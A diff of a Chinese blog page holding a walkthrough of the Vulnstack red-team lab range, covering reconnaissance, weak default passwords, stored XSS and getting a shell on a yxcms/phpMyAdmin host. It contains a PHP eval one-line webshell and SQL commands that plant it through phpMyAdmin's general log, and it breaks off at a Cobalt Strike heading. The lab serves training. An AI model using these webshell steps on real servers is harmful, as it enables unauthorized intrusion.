@@ -5,8 +5,8 @@
 <head>
     <meta charset="utf-8">
     <meta name="keywords" content="Vulnstack红队评估实战靶场系列一, Hdys0vn&#39;s Blog">
-    <meta name="description" content="ATT&amp;amp;CK红队评估实战靶场（一）0x01 前言一直想要学习内网知识，看了很多文章，感觉还是眼高手低，还是依然很菜。马上改准备实习了，想着输出一点东西，能够写到简历里，说到底，还是菜啊！！！
-本靶机环境是红日团队开源的一个红队实战测">
+    <meta name="description" content="ATT&amp;amp;CK红队评估实战靶场（一）0x01 前言​    一直想要学习内网知识，看了很多文章，感觉还是眼高手低，还是依然很菜。马上改准备实习了，想着输出一点东西，能够写到简历里，说到底，还是菜啊！！！
+本靶机环境是红日团队开源的一个">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -472,7 +472,7 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="ATT-amp-CK红队评估实战靶场（一）"><a href="#ATT-amp-CK红队评估实战靶场（一）" class="headerlink" title="ATT&amp;CK红队评估实战靶场（一）"></a>ATT&amp;CK红队评估实战靶场（一）</h1><h3 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h3><p>一直想要学习内网知识，看了很多文章，感觉还是眼高手低，还是依然很菜。马上改准备实习了，想着输出一点东西，能够写到简历里，说到底，还是菜啊！！！</p>
+                <h1 id="ATT-amp-CK红队评估实战靶场（一）"><a href="#ATT-amp-CK红队评估实战靶场（一）" class="headerlink" title="ATT&amp;CK红队评估实战靶场（一）"></a>ATT&amp;CK红队评估实战靶场（一）</h1><h3 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h3><p>​    一直想要学习内网知识，看了很多文章，感觉还是眼高手低，还是依然很菜。马上改准备实习了，想着输出一点东西，能够写到简历里，说到底，还是菜啊！！！</p>
 <p>本靶机环境是红日团队开源的一个红队实战测试环境，靶机下载地址如下：</p>
 <pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;vulnstack.qiyuanxuetang.net&#x2F;vuln&#x2F;detail&#x2F;2&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
@@ -481,31 +481,61 @@
 <h2 id="0x03-攻入内网"><a href="#0x03-攻入内网" class="headerlink" title="0x03 攻入内网"></a>0x03 攻入内网</h2><h3 id="3-1-信息收集"><a href="#3-1-信息收集" class="headerlink" title="3.1. 信息收集"></a>3.1. 信息收集</h3><h4 id="3-1-1-主机探测"><a href="#3-1-1-主机探测" class="headerlink" title="3.1.1 主机探测"></a>3.1.1 主机探测</h4><pre class="line-numbers language-none"><code class="language-none">netdiscover -i eth0 -r 192.168.1.0&#x2F;24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="/2022/03/16/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%80/image-20220316083407043.png"></p>
-<h4 id="3-1-2-端口扫描"><a href="#3-1-2-端口扫描" class="headerlink" title="3.1.2 端口扫描"></a>3.1.2 端口扫描</h4><p>发现IP192.168.1.102，使用nmap探测其端口开放情况</p>
+<h4 id="3-1-2-端口扫描"><a href="#3-1-2-端口扫描" class="headerlink" title="3.1.2 端口扫描"></a>3.1.2 端口扫描</h4><p>​    发现IP192.168.1.102，使用nmap探测其端口开放情况</p>
 <p><img src="/2022/03/16/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%80/image-20220316083633458.png"></p>
-<p>发现80端口开启，访问页面<code>http://192.168.1.103/</code>发现页面如下，存在大量信息泄露，收集有效信息</p>
+<p>​    发现80端口开启，访问页面<code>http://192.168.1.103/</code>发现页面如下，存在大量信息泄露，收集有效信息</p>
 <p><img src="/2022/03/16/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%80/image-20220316083750415.png"></p>
-<h4 id="3-1-3-目录扫描"><a href="#3-1-3-目录扫描" class="headerlink" title="3.1.3 目录扫描"></a>3.1.3 目录扫描</h4><p>使用使用御剑目录扫描专业版进行目录扫描(网站目录扫描的全面及准确性与字典有关，良好的字典能够发现别人发现不了的目录)</p>
+<h4 id="3-1-3-目录扫描"><a href="#3-1-3-目录扫描" class="headerlink" title="3.1.3 目录扫描"></a>3.1.3 目录扫描</h4><p>​    使用使用御剑目录扫描专业版进行目录扫描(网站目录扫描的全面及准确性与字典有关，良好的字典能够发现别人发现不了的目录)</p>
 <p><img src="/2022/03/16/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%80/image-20220316085429546.png"></p>
-<p>发现网站备份文件和phpadmin后台管理界面</p>
+<p>​    发现网站备份文件和phpadmin后台管理界面</p>
 <p><img src="/2022/03/16/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%80/image-20220316090035081.png"></p>
-<p>打开备份文件发现网站源码，打开robots.txt发现网站CMS为yxcms，访问<code>http://192.168.1.3/yxcms</code>进入网站首页</p>
+<p>​    打开备份文件发现网站源码，打开robots.txt发现网站CMS为yxcms，访问<code>http://192.168.1.3/yxcms</code>进入网站首页</p>
 <p><img src="/2022/03/16/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%80/image-20220316090223570.png"></p>
-<h3 id="3-2-漏洞利用"><a href="#3-2-漏洞利用" class="headerlink" title="3.2. 漏洞利用"></a>3.2. 漏洞利用</h3><h4 id="3-2-1-漏洞发现"><a href="#3-2-1-漏洞发现" class="headerlink" title="3.2.1 漏洞发现"></a>3.2.1 漏洞发现</h4><h5 id="3-2-1-1-漏洞一：信息泄露-弱口令"><a href="#3-2-1-1-漏洞一：信息泄露-弱口令" class="headerlink" title="3.2.1.1 漏洞一：信息泄露+弱口令"></a>3.2.1.1 漏洞一：信息泄露+弱口令</h5><p>网站泄露后台地址和用户密码，且用户密码为弱口令</p>
+<h3 id="3-2-漏洞利用"><a href="#3-2-漏洞利用" class="headerlink" title="3.2. 漏洞利用"></a>3.2. 漏洞利用</h3><h4 id="3-2-1-漏洞发现"><a href="#3-2-1-漏洞发现" class="headerlink" title="3.2.1 漏洞发现"></a>3.2.1 漏洞发现</h4><h5 id="3-2-1-1-漏洞一：信息泄露-弱口令"><a href="#3-2-1-1-漏洞一：信息泄露-弱口令" class="headerlink" title="3.2.1.1 漏洞一：信息泄露+弱口令"></a>3.2.1.1 漏洞一：信息泄露+弱口令</h5><p>​    网站泄露后台地址和用户密码，且用户密码为弱口令</p>
 <p><img src="/2022/03/16/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%80/image-20220316090332375.png"></p>
-<p>成功登陆网站后台</p>
+<p>​    成功登陆网站后台</p>
 <p><img src="/2022/03/16/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%80/image-20220316090504559.png"></p>
-<h5 id="3-2-1-2-漏洞二：PhpMyAdmin弱口令"><a href="#3-2-1-2-漏洞二：PhpMyAdmin弱口令" class="headerlink" title="3.2.1.2 漏洞二：PhpMyAdmin弱口令"></a>3.2.1.2 漏洞二：PhpMyAdmin弱口令</h5><p>发现使用默认用户名&#x2F;口令（root&#x2F;root）成功登录PhpMyAdmin管理页面</p>
+<h5 id="3-2-1-2-漏洞二：PhpMyAdmin弱口令"><a href="#3-2-1-2-漏洞二：PhpMyAdmin弱口令" class="headerlink" title="3.2.1.2 漏洞二：PhpMyAdmin弱口令"></a>3.2.1.2 漏洞二：PhpMyAdmin弱口令</h5><p>​    发现使用默认用户名&#x2F;口令（root&#x2F;root）成功登录PhpMyAdmin管理页面</p>
 <p><img src="/2022/03/16/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%80/image-20220316090650585.png"></p>
-<h5 id="3-2-1-3-漏洞三：yxcms留言本XSS存储型漏洞"><a href="#3-2-1-3-漏洞三：yxcms留言本XSS存储型漏洞" class="headerlink" title="3.2.1.3 漏洞三：yxcms留言本XSS存储型漏洞"></a>3.2.1.3 漏洞三：yxcms留言本XSS存储型漏洞</h5><p>前台提交带有XSS代码的留言</p>
+<h5 id="3-2-1-3-漏洞三：yxcms留言本XSS存储型漏洞"><a href="#3-2-1-3-漏洞三：yxcms留言本XSS存储型漏洞" class="headerlink" title="3.2.1.3 漏洞三：yxcms留言本XSS存储型漏洞"></a>3.2.1.3 漏洞三：yxcms留言本XSS存储型漏洞</h5><p>​    前台提交带有XSS代码的留言</p>
 <p><img src="/2022/03/16/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%80/image-20220316091444360.png"></p>
-<p>后台审核时成功弹出xss窗口</p>
+<p>​    后台审核时成功弹出xss窗口</p>
 <p><img src="/2022/03/16/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%80/image-20220316091557461.png"></p>
-<p>审核通过后在网站留言板部分也会弹出xss弹窗</p>
+<p>​    审核通过后在网站留言板部分也会弹出xss弹窗</p>
 <p><img src="/2022/03/16/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%80/image-20220316091847996.png"></p>
-<p>可通过该漏洞获取管理员cookie或者诱导管理员点击执行某恶意代码</p>
-<h5 id="3-2-1-4-漏洞四：yxcms后台任意文件读写漏洞"><a href="#3-2-1-4-漏洞四：yxcms后台任意文件读写漏洞" class="headerlink" title="3.2.1.4 漏洞四：yxcms后台任意文件读写漏洞"></a>3.2.1.4 漏洞四：yxcms后台任意文件读写漏洞</h5><p>在后台创建新模板模块创建内容为一句话的新模板</p>
+<p>​    可通过该漏洞获取管理员cookie或者诱导管理员点击执行某恶意代码</p>
+<h5 id="3-2-1-4-漏洞四：yxcms后台任意文件读写漏洞"><a href="#3-2-1-4-漏洞四：yxcms后台任意文件读写漏洞" class="headerlink" title="3.2.1.4 漏洞四：yxcms后台任意文件读写漏洞"></a>3.2.1.4 漏洞四：yxcms后台任意文件读写漏洞</h5><p>​    在后台创建新模板模块创建内容为一句话的新模板</p>
+<p><img src="/2022/03/16/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%80/image-20220316111906759.png"></p>
+<p>通过前面的备份文件可知文件保存的目录</p>
+<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;192.168.1.3&#x2F;yxcms&#x2F;protected&#x2F;apps&#x2F;default&#x2F;view&#x2F;default&#x2F;hack.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
+<p><img src="/2022/03/16/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%80/1605154-20200928100450964-1245106639.png"></p>
+<p>​    使用蚁剑成功连接shell</p>
+<p><img src="/2022/03/16/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%80/image-20220316112139929.png"></p>
+<h5 id="3-2-1-5-漏洞五：yxcms后台SQL注入漏洞"><a href="#3-2-1-5-漏洞五：yxcms后台SQL注入漏洞" class="headerlink" title="3.2.1.5 漏洞五：yxcms后台SQL注入漏洞"></a>3.2.1.5 漏洞五：yxcms后台SQL注入漏洞</h5><p>​    在后台的碎片列表中进行删除操作，删除碎片ID可能存在盲注漏洞，使用dnslog获取SQL注入得到数据。</p>
+<p>yxcms漏洞代码原理解析参考文章<a target="_blank" rel="noopener" href="https://www.freebuf.com/column/162886.html">https://www.freebuf.com/column/162886.html</a></p>
+<h5 id="3-2-1-6-漏洞六：PhpMyAdmin开启全局日志getshell"><a href="#3-2-1-6-漏洞六：PhpMyAdmin开启全局日志getshell" class="headerlink" title="3.2.1.6 漏洞六：PhpMyAdmin开启全局日志getshell"></a>3.2.1.6 漏洞六：PhpMyAdmin开启全局日志getshell</h5><p>​    前面我们已经登陆到phpmyadmin，那么我们首先可以测试一下是否可以使用select into outfile直接写入</p>
+<pre class="line-numbers language-none"><code class="language-none">Select &#39;&lt;?php eval($_POST[hack]);?&gt; &#39; into outfile &#39;C:&#x2F;phpStudy&#x2F;WWW&#x2F;hack.php&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/2022/03/16/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%80/image-20220316112634592.png"></p>
+<p>写入失败， </p>
+<pre class="line-numbers language-none"><code class="language-none">SHOW GLOBAL VARIABLES LIKE &#39;%secure%&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>查看变量secure-file-priv 值为NULL，且为只读无法修改。</p>
+<p>尝试使用全局日志写入shell，查看全局变量general_log：</p>
+<pre class="line-numbers language-none"><code class="language-none">SHOW GLOBAL VARIABLES LIKE &#39;%general_%&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/2022/03/16/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%80/image-20220316113228177.png"></p>
+<p>开启全局日志并修改日志保存位置为C:&#x2F;phpStudy&#x2F;WWW&#x2F;hack.php</p>
+<pre class="line-numbers language-none"><code class="language-none">set global general_log&#x3D;on;
+set global general_log_file&#x3D;&#39;C:&#x2F;phpStudy&#x2F;WWW&#x2F;hack.php&#39;;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p><img src="/2022/03/16/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%80/image-20220316113435571.png"></p>
+<p>查询一句话写入日志<code>Select &#39;&lt;?php eval($_POST[hack]);?&gt;&#39;</code></p>
+<p><img src="/2022/03/16/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%80/image-20220316113553829.png"></p>
+<p>使用蚁剑连接一句话木马<code>http://192.168.1.3/hack.php</code></p>
+<p><img src="/2022/03/16/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%80/image-20220316113709282.png"></p>
+<h3 id="3-3-CS上线GetShell"><a href="#3-3-CS上线GetShell" class="headerlink" title="3.3 CS上线GetShell"></a>3.3 CS上线GetShell</h3>
                 
             </div>
             <hr/>
